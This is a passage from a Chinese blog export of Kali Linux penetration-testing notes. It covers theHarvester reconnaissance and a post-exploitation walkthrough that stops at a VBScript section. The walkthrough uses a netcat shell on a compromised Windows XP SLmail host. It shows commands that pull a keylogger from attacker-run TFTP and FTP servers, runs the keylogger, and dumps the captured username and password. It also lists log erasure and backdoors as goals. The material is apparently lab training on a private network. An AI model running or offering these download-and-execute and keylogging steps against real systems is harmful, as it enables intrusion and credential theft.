<p><strong>其它命令同理！</strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>web 信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 中 theharvester 的使用</title>
    <url>/2021/11/17/Kali%20%E4%B8%AD%20theharvester%20%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="theharvester-简介">1、theharvester 简介</h2>
<p>theharvester是一个社会工程学工具，它通过搜索引擎、PGP服务器以及SHODAN数据库收集用户的email，子域名，主机，雇员名，开放端口和banner信息。</p>
<h2 id="帮助命令">2、帮助命令</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># theharvester -h</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*******************************************************************</span></span><br><span class="line"><span class="string">*                                                                 *</span></span><br><span class="line"><span class="string">* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *</span></span><br><span class="line"><span class="string">* | __| &#x27;</span>_ \ / _ \  / /_/ / _` | <span class="string">&#x27;__\ \ / / _ \/ __| __/ _ \ &#x27;</span>__| *</span><br><span class="line">* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *</span><br><span class="line">*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *</span><br><span class="line">*                                                                 *</span><br><span class="line">* theHarvester Ver. 3.0.6                                         *</span><br><span class="line">* Coded by Christian Martorella                                   *</span><br><span class="line">* Edge-Security Research                                          *</span><br><span class="line">* cmartorella@edge-security.com                                   *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Usage: theharvester options </span><br><span class="line"></span><br><span class="line">       -d: Domain to search or company name</span><br><span class="line">       -b: data <span class="built_in">source</span>: xxx, bing, bingapi, censys, crtsh, dogpile,       <span class="comment">#指定搜索途径</span></span><br><span class="line">                        google, google-certificates, googleCSE, googleplus, google-profiles,</span><br><span class="line">                        hunter, linkedin, netcraft, pgp, threatcrowd,</span><br><span class="line">                        twitter, vhost, virustotal, yahoo, all</span><br><span class="line">       -g: use Google dorking instead of normal Google search</span><br><span class="line">       -s: start <span class="keyword">in</span> result number X (default: 0)</span><br><span class="line">       -v: verify host name via DNS resolution and search <span class="keyword">for</span> virtual hosts</span><br><span class="line">       -f: save the results into an HTML and XML file (both)</span><br><span class="line">       -n: perform a DNS reverse query on all ranges discovered</span><br><span class="line">       -c: perform a DNS brute force <span class="keyword">for</span> the domain name</span><br><span class="line">       -t: perform a DNS TLD expansion discovery</span><br><span class="line">       -e: use this DNS server</span><br><span class="line">       -p: port scan the detected hosts and check <span class="keyword">for</span> Takeovers (80,443,22,21,8080)</span><br><span class="line">       -l: <span class="built_in">limit</span> the number of results to work with(Bing goes from 50 to 50 results,</span><br><span class="line">            Google 100 to 100, and PGP doesn<span class="string">&#x27;t use this option)</span></span><br><span class="line"><span class="string">       -h: use SHODAN database to query discovered hosts</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Examples:</span></span><br><span class="line"><span class="string">        theharvester -d microsoft.com -l 500 -b google -f myresults.html</span></span><br><span class="line"><span class="string">        theharvester -d microsoft.com -b pgp, virustotal</span></span><br><span class="line"><span class="string">        theharvester -d microsoft -l 200 -b linkedin</span></span><br><span class="line"><span class="string">        theharvester -d microsoft.com -l 200 -g -b google</span></span><br><span class="line"><span class="string">        theharvester -d apple.com -b googleCSE -l 500 -s 300</span></span><br><span class="line"><span class="string">        theharvester -d cornell.edu -l 100 -b bing -h </span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>-d:要搜索的域名或公司名称</p></li>
<li><p>-b:数据源:百度，bing, bingapi, censys, crtsh,
dogpile，google，googleecse, googleplus, google profiles，hunter,
linkedin, netcraft, pgp, threatcrowd，twitter………………</p></li>
<li><p>-g:使用谷歌代替普通的谷歌搜索</p></li>
<li><p>-s:从结果号X开始(默认为0)</p></li>
<li><p>-v:通过DNS解析验证主机名，搜索虚拟主机</p></li>
<li><p>-f:将结果保存为HTML和XML文件(两者)</p></li>
<li><p>-n:对发现的所有范围进行DNS反向查询</p></li>
<li><p>-c:对域名执行DNS暴力解析</p></li>
<li><p>-t:执行DNS TLD扩容发现</p></li>
<li><p>-e:使用此DNS服务器</p></li>
<li><p>-p: 端口扫描</p></li>
<li><p>-l:限制要处理的结果的数量(Bing从50到50个结果，谷歌100到100，并且PGP不使用这个选项)</p></li>
<li><p>-h:使用SHODAN数据库查询已发现的主机</p></li>
</ul>
<p><strong>举例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># theharvester -d xxx.com -l 100 -b google -f 1.html</span></span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*******************************************************************</span></span><br><span class="line"><span class="string">*                                                                 *</span></span><br><span class="line"><span class="string">* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *</span></span><br><span class="line"><span class="string">* | __| &#x27;</span>_ \ / _ \  / /_/ / _` | <span class="string">&#x27;__\ \ / / _ \/ __| __/ _ \ &#x27;</span>__| *</span><br><span class="line">* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *</span><br><span class="line">*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *</span><br><span class="line">*                                                                 *</span><br><span class="line">* theHarvester Ver. 3.0.6                                         *</span><br><span class="line">* Coded by Christian Martorella                                   *</span><br><span class="line">* Edge-Security Research                                          *</span><br><span class="line">* cmartorella@edge-security.com                                   *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">found supported engines</span><br><span class="line">[-] Starting harvesting process <span class="keyword">for</span> domain: xxx.com</span><br><span class="line"></span><br><span class="line">[-] Searching <span class="keyword">in</span> Google:</span><br><span class="line">    Searching 0 results...</span><br><span class="line">    Searching 100 results...</span><br><span class="line"></span><br><span class="line">Harvesting results</span><br><span class="line">No IP addresses found</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Emails found:            <span class="comment">#先去查询邮件信息，但未找到</span></span><br><span class="line">------------------</span><br><span class="line">No emails found</span><br><span class="line"> </span><br><span class="line">[+] Hosts found <span class="keyword">in</span> search engines:        <span class="comment">#查询到了5个主机信息</span></span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line">Total hosts: 5</span><br><span class="line"></span><br><span class="line">[-] Resolving hostnames IPs... </span><br><span class="line"> </span><br><span class="line">m.xxx.com:xxx.xxx.44.91</span><br><span class="line">xxx.xxx.com:xxx.xxx.96.52</span><br><span class="line">research.xxx.com:xxx.xxx.149.102</span><br><span class="line">srf.xxx.com:xxx.xxx.111.88</span><br><span class="line">www.xxx.com:xxx.xxx.44.95</span><br><span class="line">NEW REPORTING BEGINS:</span><br><span class="line">Error <span class="keyword">in</span> the reportgraph module: </span><br><span class="line">The plotly.plotly module is deprecated,</span><br><span class="line">please install the chart-studio package and use the</span><br><span class="line">chart_studio.plotly module instead. </span><br><span class="line"></span><br><span class="line">module <span class="string">&#x27;lib.reportgraph&#x27;</span> has no attribute <span class="string">&#x27;graphgenerator&#x27;</span></span><br><span class="line">Error creating the file</span><br><span class="line">Files saved!</span><br><span class="line">root@kali:~<span class="comment"># ls</span></span><br><span class="line">1.xml  Desktop  Documents  Downloads  Music  Pictures  Public  stash.sqlite  Templates  Videos</span><br><span class="line">root@kali:</span><br></pre></td></tr></table></figure>
<p><strong>备注：</strong>
为避免带来不必要的麻烦，对某个域名使用"xxx"做了替换！</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>web 信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 后渗透</title>
    <url>/2022/02/07/Kali%20%E5%90%8E%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="概述">1. 概述</h2>
<p><strong>• 上传工具</strong></p>
<p><strong>• 提权</strong></p>
<p><strong>• 擦除攻击痕迹</strong></p>
<p>删除系统日记和应用程序日记</p>
<p><strong>示例（SLmail）</strong> ：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207111535712-921626053.png" /></p>
<p><strong>• 安装后门</strong></p>
<p>• 长期控制</p>
<p>• Dump 密码</p>
<p>• 内网渗透</p>
<p><strong>• 后漏洞利用阶段</strong></p>
<p>• 最大的挑战 ----防病毒软件（免杀）</p>
<p>• 使用合法的远程控制软件（如 nc）</p>
<p><strong>• 上传文件</strong></p>
<p>• 持久控制</p>
<p>• 扩大对目标系统的控制能力</p>
<p>• Linux系统</p>
<p>• netcat，curl，wget</p>
<p>curl和wget一定会在linux系统下默认安装</p>
<p>• Windows</p>
<p>• 缺少预装的下载工具，难以进行木马等工具的下载</p>
<p><strong>• 非交互模式</strong> <strong>shell</strong>
（如该命令行窗口下必须输入完整的命令，无法tab键补全）</p>
<p>• 类 NC远程控制shell</p>
<p>• 交互型shell与非交互型shell区别：<a
href="http://kuku789123.blog.163.com/blog/static/1361673512012101513628599/"
class="uri">http://kuku789123.blog.163.com/blog/static/1361673512012101513628599/</a></p>
<p>• ftp IP</p>
<p>在windows系统下安装ftp软件，体验非交互型shell的不足，添加/删除组件中【appwiz.cpl】【需插入光盘】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207112201614-635254903.png" /></p>
<p><strong>备注：IIS5.1 组件安装包：<a
href="https://www.cr173.com/soft/2482.html"
class="uri">https://www.cr173.com/soft/2482.html</a></strong></p>
<p><strong>非交互：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207120735548-774133434.png" /></p>
<p><strong>交互：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207120824218-1501654803.png" /></p>
<h2 id="上传文件">2. 上传文件</h2>
<h3 id="tftp传输">1、TFTP传输</h3>
<p>XP、2003中已默认安装，Win7、2008以后的系统需要单独添加，但经常被边界防火墙过滤。主流为FTP，是因为基于UDP协议，明文传输，不支持身份验证（无需登录验证即可下载服务器文件）</p>
<p>即构造一个TFTP服务器，在服务器中放置工具木马等，再通过被控端连接下载。</p>
<p><strong>1.1 环境部署</strong></p>
<p><strong>Kali：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># mkdir tftp</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cp /usr/share/windows-binaries/whoami.exe tftp/ #windows下查看当前用户</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cp /usr/share/windows-binaries/klogger.exe tftp/ #拷贝键盘记录器</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls tftp/</span></span><br><span class="line">klogger.exe  whoami.exe</span><br><span class="line">root@kali:~/Desktop<span class="comment"># ls tftp/ -l</span></span><br><span class="line">total 92</span><br><span class="line">-rwxr-xr-x 1 root root 23552 Feb  6 23:16 klogger.exe</span><br><span class="line">-rwxr-xr-x 1 root root 66560 Feb  6 23:16 whoami.exe</span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># chown -R nobody /root/Desktop/tftp/将所有者改成nobody</span></span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># ls -ll</span></span><br><span class="line">total 92</span><br><span class="line">-rwxr-xr-x 1 nobody root 23552 Feb  6 23:16 klogger.exe</span><br><span class="line">-rwxr-xr-x 1 nobody root 66560 Feb  6 23:16 whoami.exe</span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># atftpd --daemon --port 69 /root/Desktop/tftp/</span></span><br><span class="line">root@kali:~/Desktop/tftp<span class="comment"># netstat -pantu | grep 69</span></span><br><span class="line">udp        0      0 0.0.0.0:69              0.0.0.0:*                           1636/atftpd</span><br></pre></td></tr></table></figure>
<p>由于权限问题，会出现以下这个常见问题（启动进程不是tftp）：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207124602936-1871657981.png" /></p>
<p>需kill 543这个进程，使用chown -R nobody /tftp/
【将所有者改成nobody】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207124722446-1368520904.png" /></p>
<p><strong>1.2 shell传输文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># nc -vlp 444</span></span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">10.10.10.131: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.10.171] from (UNKNOWN) [10.10.10.131] 1108</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Program Files\SLmail\System&gt;<span class="built_in">cd</span> \</span><br><span class="line"><span class="built_in">cd</span> \</span><br><span class="line"></span><br><span class="line">C:\&gt;tftp</span><br><span class="line">tftp</span><br><span class="line"></span><br><span class="line">Transfers files to and from a remote computer running the TFTP service.</span><br><span class="line"></span><br><span class="line">TFTP [-i] host [GET | PUT] <span class="built_in">source</span> [destination]</span><br><span class="line"></span><br><span class="line">  -i              Specifies binary image transfer mode (also called</span><br><span class="line">                  octet). In binary image mode the file is moved</span><br><span class="line">                  literally, byte by byte. Use this mode when</span><br><span class="line">                  transferring binary files.</span><br><span class="line">  host            Specifies the <span class="built_in">local</span> or remote host.</span><br><span class="line">  GET             Transfers the file destination on the remote host to</span><br><span class="line">                  the file <span class="built_in">source</span> on the <span class="built_in">local</span> host.</span><br><span class="line">  PUT             Transfers the file <span class="built_in">source</span> on the <span class="built_in">local</span> host to</span><br><span class="line">                  the file destination on the remote host.</span><br><span class="line">  <span class="built_in">source</span>          Specifies the file to transfer.</span><br><span class="line">  destination     Specifies <span class="built_in">where</span> to transfer the file.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**C:\** **&gt; tftp -i 10.10.10.171 get <span class="built_in">whoami</span>** **.exe**</span><br><span class="line">tftp -i 10.10.10.171 get whoami.exe</span><br><span class="line">Transfer successful: 66560 bytes <span class="keyword">in</span> 1 second, 66560 bytes/s</span><br><span class="line"></span><br><span class="line">**C:\** **&gt; tftp -i 10.10.10.171** **get klogger.exe**</span><br><span class="line">tftp -i 10.10.10.171 get klogger.exe</span><br><span class="line">Transfer successful: 23552 bytes <span class="keyword">in</span> 1 second, 23552 bytes/s</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/07/2022  12:40 PM                41 1.txt</span><br><span class="line">08/14/2011  01:35 PM                 0 AUTOEXEC.BAT</span><br><span class="line">08/14/2011  01:35 PM                 0 CONFIG.SYS</span><br><span class="line">01/28/2022  01:28 PM    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02/07/2022  11:40 AM             1,120 HistorySvr.txt</span><br><span class="line">01/28/2010  06:10 PM    &lt;DIR&gt;          I386</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          Inetpub</span><br><span class="line">**02 /07/2022  12:50 PM            23,552 klogger.exe</span><br><span class="line">**01/28/2022  01:38 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">01/27/2022  07:46 PM    &lt;DIR&gt;          Python27</span><br><span class="line">02/07/2022  12:27 PM                 0 TFTP4092</span><br><span class="line">02/07/2022  12:25 PM                 0 TFTP588</span><br><span class="line">**02 /07/2022  12:50 PM            66,560 whoami.exe</span><br><span class="line">**02/07/2022  11:49 AM    &lt;DIR&gt;          WINDOWS</span><br><span class="line">               8 File(s)         91,273 bytes</span><br><span class="line">               6 Dir(s)  39,066,075,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">whoami</span>    </span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">C:\&gt;klogger</span><br><span class="line">klogger</span><br><span class="line"></span><br><span class="line">C:\&gt;tasklist</span><br><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">Image Name                   PID Session Name     Session<span class="comment">#    Mem Usage</span></span><br><span class="line">========================= ====== ================ ======== ============</span><br><span class="line">System Idle Process            0 Console                 0         28 K</span><br><span class="line">System                         4 Console                 0        236 K</span><br><span class="line">smss.exe                     560 Console                 0        388 K</span><br><span class="line">csrss.exe                    608 Console                 0      3,852 K</span><br><span class="line">winlogon.exe                 632 Console                 0      1,620 K</span><br><span class="line">services.exe                 676 Console                 0      4,312 K</span><br><span class="line">lsass.exe                    688 Console                 0      1,476 K</span><br><span class="line">vmacthlp.exe                 848 Console                 0      2,380 K</span><br><span class="line">svchost.exe                  860 Console                 0      4,700 K</span><br><span class="line">svchost.exe                  940 Console                 0      4,100 K</span><br><span class="line">svchost.exe                 1032 Console                 0     21,332 K</span><br><span class="line">svchost.exe                 1080 Console                 0      3,376 K</span><br><span class="line">svchost.exe                 1124 Console                 0      4,284 K</span><br><span class="line">spoolsv.exe                 1404 Console                 0      6,008 K</span><br><span class="line">HistorySvr.exe              1572 Console                 0      3,248 K</span><br><span class="line">sntlkeyssrvr.exe            1668 Console                 0      2,364 K</span><br><span class="line">spnsrvnt.exe                1820 Console                 0      2,120 K</span><br><span class="line">SLadmin.exe                 1836 Console                 0      3,088 K</span><br><span class="line">SLSmtp.exe                  1908 Console                 0      4,748 K</span><br><span class="line">vmtoolsd.exe                1944 Console                 0      8,484 K</span><br><span class="line">SLMail.exe                  2020 Console                 0      5,208 K</span><br><span class="line">VMUpgradeHelper.exe          176 Console                 0      3,856 K</span><br><span class="line">alg.exe                     1100 Console                 0      3,432 K</span><br><span class="line">explorer.exe                1708 Console                 0     24,048 K</span><br><span class="line">VMwareTray.exe              2164 Console                 0      4,468 K</span><br><span class="line">VMwareUser.exe              2196 Console                 0      7,688 K</span><br><span class="line">ICQLite.exe                 2204 Console                 0     14,308 K</span><br><span class="line">wscntfy.exe                 2216 Console                 0      1,904 K</span><br><span class="line">inetinfo.exe                2324 Console                 0      9,720 K</span><br><span class="line">cmd.exe                      516 Console                 0      2,508 K</span><br><span class="line">ftp.exe                     1984 Console                 0      2,880 K</span><br><span class="line">cmd.exe                     3996 Console                 0      2,504 K</span><br><span class="line">ftp.exe                     4080 Console                 0      2,884 K</span><br><span class="line">taskmgr.exe                 2824 Console                 0      1,344 K</span><br><span class="line">cmd.exe                     3040 Console                 0      2,672 K</span><br><span class="line">**klogger.exe** **964 Console                 0        792** **K**</span><br><span class="line">tasklist.exe                 592 Console                 0      4,080 K</span><br><span class="line">wmiprvse.exe                2976 Console                 0      5,572 K</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/07/2022  12:54 PM                30 1.txt</span><br><span class="line">08/14/2011  01:35 PM                 0 AUTOEXEC.BAT</span><br><span class="line">08/14/2011  01:35 PM                 0 CONFIG.SYS</span><br><span class="line">01/28/2022  01:28 PM    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02/07/2022  11:40 AM             1,120 HistorySvr.txt</span><br><span class="line">01/28/2010  06:10 PM    &lt;DIR&gt;          I386</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          Inetpub</span><br><span class="line">02/07/2022  12:50 PM            23,552 klogger.exe</span><br><span class="line">02/07/2022  12:54 PM                32 klogger.txt</span><br><span class="line">01/28/2022  01:38 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">01/27/2022  07:46 PM    &lt;DIR&gt;          Python27</span><br><span class="line">02/07/2022  12:27 PM                 0 TFTP4092</span><br><span class="line">02/07/2022  12:25 PM                 0 TFTP588</span><br><span class="line">02/07/2022  12:50 PM            66,560 whoami.exe</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          WINDOWS</span><br><span class="line">               9 File(s)         91,294 bytes</span><br><span class="line">               6 Dir(s)  39,066,075,136 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">type</span> klogger.txt　　　　<span class="comment">#目标机的键盘记录</span></span><br><span class="line"><span class="built_in">type</span> klogger.txt</span><br><span class="line">ausername:z9m8r8</span><br><span class="line">password:1111s</span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
<h3 id="ftp传输">2、FTP传输</h3>
<p><strong>2.1 环境部署</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># apt-get install pure-ftpd</span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree   </span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  libcrypt1 libpam0g pure-ftpd-common</span><br><span class="line">Suggested packages:</span><br><span class="line">……………………</span><br></pre></td></tr></table></figure>
<p><strong>配置脚本(ftp1.sh)：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">groupadd ftpgroup</span><br><span class="line">useradd -g ftpgroup -d /dev/null -s /etc ftpuser</span><br><span class="line">pure-pw useradd yuanfh -u ftpuser -d /ftphome</span><br><span class="line">pure-pw mkdb</span><br><span class="line"><span class="built_in">cd</span> /etc/pure-ftpd/auth/</span><br><span class="line"><span class="built_in">ln</span> -s ../conf/PureDB 60pdb</span><br><span class="line"><span class="built_in">mkdir</span> -p /ftphome</span><br><span class="line"><span class="built_in">chown</span> -R ftpuser:ftpgroup /ftphome/                   <span class="comment">#创建的ftp主目录</span></span><br><span class="line">/etc/init.d/pure-ftpd restart</span><br></pre></td></tr></table></figure>
<p><strong>脚本执行：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/tftp<span class="comment"># ./ftp1.sh </span></span><br><span class="line">Password:      <span class="comment">#此处设的密码要记住，后面会需要</span></span><br><span class="line">Enter it again: </span><br><span class="line">Restarting pure-ftpd (via systemctl): pure-ftpd.service. </span><br></pre></td></tr></table></figure>
<p><strong>要上传的工具复制到 /ftphome/ 下</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/<span class="comment"># ls /ftphome/</span></span><br><span class="line">root@kali:/<span class="comment"># cp /usr/share/windows-binaries/whoami.exe /ftphome/</span></span><br><span class="line">root@kali:/<span class="comment"># cp /usr/share/windows-binaries/klogger.exe /ftphome/</span></span><br></pre></td></tr></table></figure>
<p><strong>测试ftp:</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207141421494-985347852.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220207143159410-1225108199.png" /></p>
<p>由于目前获得的shell是非交互模式的，ftp传输时，在password命令处无法显示，所以当前直接利用ftp下载行不通，故转换思路：将要实现的命令写到目标服务器的文本文件中，用ftp读取文本文件的命令进行下载即可。</p>
<p><strong>2.2 上传文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">echo</span> open 10.10.10.171 21&gt;ftp.txt     </span><br><span class="line"><span class="built_in">echo</span> yuanfh&gt;&gt;ftp.txt</span><br><span class="line"><span class="built_in">echo</span> password&gt;&gt;ftp.txt　　　　<span class="comment">#password是前面设置的密码</span></span><br><span class="line"><span class="built_in">echo</span> bin&gt;&gt;ftp.txt</span><br><span class="line"><span class="built_in">echo</span> GET whoami.exe &gt;&gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> GET klogger.exe &gt;&gt; ftp.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">bye</span> &gt;&gt; ftp.txt</span><br><span class="line"> <span class="built_in">echo</span> open 10.10.10.171 21&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> yuanfh&gt;&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> password&gt;&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> bin&gt;&gt;ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> GET whoami.exe &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> GET klogger.exe &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="built_in">bye</span> &gt;&gt; ftp.txt</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">type</span> ftp.txt</span><br><span class="line"><span class="built_in">type</span> ftp.txt</span><br><span class="line">open 10.10.10.171 21</span><br><span class="line">yuanfh</span><br><span class="line">password</span><br><span class="line">bin</span><br><span class="line">GET whoami.exe </span><br><span class="line">GET klogger.exe </span><br><span class="line"><span class="built_in">bye</span> </span><br><span class="line"></span><br><span class="line">C:\&gt;ftp -s:ftp.txt</span><br><span class="line">ftp -s:ftp.txt</span><br><span class="line">User (10.10.10.171:(none)): open 10.10.10.171 21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin</span><br><span class="line">GET whoami.exe </span><br><span class="line">GET klogger.exe </span><br><span class="line"><span class="built_in">bye</span> </span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\</span><br><span class="line"></span><br><span class="line">02/07/2022  12:54 PM                30 1.txt</span><br><span class="line">08/14/2011  01:35 PM                 0 AUTOEXEC.BAT</span><br><span class="line">08/14/2011  01:35 PM                 0 CONFIG.SYS</span><br><span class="line">01/28/2022  01:28 PM    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02/07/2022  02:25 PM                89 ftp.txt</span><br><span class="line">02/07/2022  11:40 AM             1,120 HistorySvr.txt</span><br><span class="line">01/28/2010  06:10 PM    &lt;DIR&gt;          I386</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          Inetpub</span><br><span class="line">02/07/2022  02:26 PM            23,552 klogger.exe</span><br><span class="line">01/28/2022  01:38 PM    &lt;DIR&gt;          Program Files</span><br><span class="line">01/27/2022  07:46 PM    &lt;DIR&gt;          Python27</span><br><span class="line">02/07/2022  12:27 PM                 0 TFTP4092</span><br><span class="line">02/07/2022  12:25 PM                 0 TFTP588</span><br><span class="line">02/07/2022  02:26 PM            66,560 whoami.exe</span><br><span class="line">02/07/2022  11:49 AM    &lt;DIR&gt;          WINDOWS</span><br><span class="line">               9 File(s)         91,351 bytes</span><br><span class="line">               6 Dir(s)  39,067,385,856 bytes free</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">whoami</span> </span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
<h3 id="vbscript传输">3、Vbscript传输</h3>
<p>VBS是windows系统上默认的解释型脚本语言，在win7后增加了perl，通过web程序，http协议下载远程控制程序。</p>
<p><strong>3.1 环境部署</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/<span class="comment"># cd /var/www/html/</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># ls</span></span><br><span class="line">index.html  index.nginx-debian.html</span><br><span class="line">root@kali:/var/www/html<span class="comment"># cp /ftphome/* .</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># ls</span></span><br><span class="line">index.html  index.nginx-debian.html  klogger.exe  whoami.exe</span><br><span class="line">root@kali:/var/www/html<span class="comment"># service apache2 start</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># netstat -pantu | grep 80</span></span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      27486/apache2    </span><br></pre></td></tr></table></figure>
<p><strong>3.2 文件传输</strong></p>
<p><strong>命令集：</strong></p>
